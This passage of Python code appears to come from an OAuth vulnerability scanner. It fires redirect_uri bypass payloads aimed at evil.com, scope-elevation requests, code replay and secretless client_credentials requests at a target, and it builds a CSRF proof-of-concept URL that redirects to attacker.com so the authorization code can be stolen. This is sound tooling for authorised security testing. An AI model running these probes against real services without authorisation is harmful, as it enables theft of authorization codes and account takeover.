    for attack_name, evil_uri in redirect_attacks.items():
        try:
            test_params = {**base_params, "redirect_uri": evil_uri}
            r = requests.get(auth_url, params=test_params, headers=_DEFAULT_HEADERS,
                             allow_redirects=False, timeout=_TIMEOUT, verify=False)
            if r.status_code in (302, 301):
                location = r.headers.get("Location", "")
                if "evil.com" in location or evil_uri.split("?")[0] in location:
                    findings.append(
                        f"CRITICAL: Redirect URI bypass ({attack_name})!\n"
                        f"  Evil URI  : {evil_uri}\n"
                        f"  Location  : {location[:100]}\n"
                        f"  Attack    : Use this redirect_uri to steal auth code"
                    )
                    out.append(f"  [BYPASS] {attack_name}: HTTP {r.status_code}")
                elif "code=" in location:
                    out.append(f"  [POSSIBLE] Code in redirect for {attack_name}")
                else:
                    out.append(f"  [error/rejected] {attack_name}: {location[:60]}")
            elif r.status_code == 400:
                out.append(f"  [rejected 400] {attack_name}")
            else:
                out.append(f"  [HTTP {r.status_code}] {attack_name}")
        except Exception as e:
            out.append(f"  [error] {attack_name}: {e}")

    # ── 3. Scope Elevation ────────────────────────────────────────────────────
    out.append("")
    out.append("── Test 3: Scope Elevation ─────────────────────")
    elevated_scopes = [
        "admin openid profile email",
        "openid profile email admin write:all read:all",
        "openid profile email offline_access",
        "all",
        "*",
        "superuser admin root",
    ]
    for elevated_scope in elevated_scopes[:4]:
        try:
            test_params = {**base_params, "scope": elevated_scope}
            r = requests.get(auth_url, params=test_params, headers=_DEFAULT_HEADERS,
                             allow_redirects=False, timeout=_TIMEOUT, verify=False)
            if r.status_code not in (400, 403):
                out.append(f"  [ACCEPTED] scope={elevated_scope!r} — HTTP {r.status_code}")
                if elevated_scope in ["admin openid profile email", "all"]:
                    findings.append(
                        f"HIGH: Elevated scope may be accepted: {elevated_scope!r}\n"
                        f"  HTTP {r.status_code} — verify if elevated permissions are granted"
                    )
            else:
                out.append(f"  [rejected {r.status_code}] scope={elevated_scope!r}")
        except Exception as e:
            out.append(f"  [error] {elevated_scope!r}: {e}")

    # ── 4. Token Leakage via Referer ──────────────────────────────────────────
    out.append("")
    out.append("── Test 4: Token Leakage via Referer ──────────")
    out.append("  Manual check required: If the app embeds the access_token in a URL")
    out.append("  (rather than body), it will leak via HTTP Referer header to any sub-requests.")
    out.append("  Look for: /callback?access_token=... or #access_token= (implicit flow)")
    out.append("  Test: Open browser DevTools → Network → check Referer headers after OAuth")

    # ── 5. Token Endpoint Tests ───────────────────────────────────────────────
    if token_url:
        out.append("")
        out.append("── Test 5: Token Endpoint ───────────────────────")

        # Code replay
        try:
            r = requests.post(token_url, data={
                "grant_type": "authorization_code",
                "code": "REPLAYED_CODE",
                "redirect_uri": redirect_uri,
                "client_id": client_id,
            }, headers=_DEFAULT_HEADERS, timeout=_TIMEOUT, verify=False)
            if r.status_code == 200:
                out.append("  [ANOMALY] Token endpoint returned 200 for replayed code — investigate")
            else:
                out.append(f"  [OK] Code replay rejected: HTTP {r.status_code}")
        except Exception as e:
            out.append(f"  Token endpoint error: {e}")

        # Client credentials with no secret
        try:
            r = requests.post(token_url, data={
                "grant_type": "client_credentials",
                "client_id": client_id,
            }, headers=_DEFAULT_HEADERS, timeout=_TIMEOUT, verify=False)
            if r.status_code == 200 and "access_token" in (r.text or ""):
                findings.append(
                    "HIGH: Token endpoint issues client_credentials token WITHOUT client_secret!\n"
                    f"  POST {token_url} with only client_id → HTTP {r.status_code}"
                )
                out.append("  [VULNERABLE] client_credentials granted without secret!")
            else:
                out.append(f"  [OK] client_credentials without secret rejected: HTTP {r.status_code}")
        except Exception as e:
            out.append(f"  client_credentials test error: {e}")

    # ── PoC Summary ───────────────────────────────────────────────────────────
    out.append("")
    out.append("── PoC Attack URLs ─────────────────────────────")
    csrf_attack_url = auth_url + "?" + _urlparse.urlencode({
        **base_params,
        "state": "",
        "redirect_uri": "https://attacker.com/callback",
    })
    out.append(f"  CSRF PoC: {csrf_attack_url[:120]}")

    out.append("")
    if findings:
        out.append("── FINDINGS ──────────────────────────────────")
        for f in findings:
            out.append(f"🔴 {f}\n")
        out.append(f"Total OAuth issues: {len(findings)}")
    else:
        out.append("No OAuth vulnerabilities automatically confirmed")
        out.append("Recommended: Manual testing with Burp Suite OAuth scanner")

    return "\n".join(out)
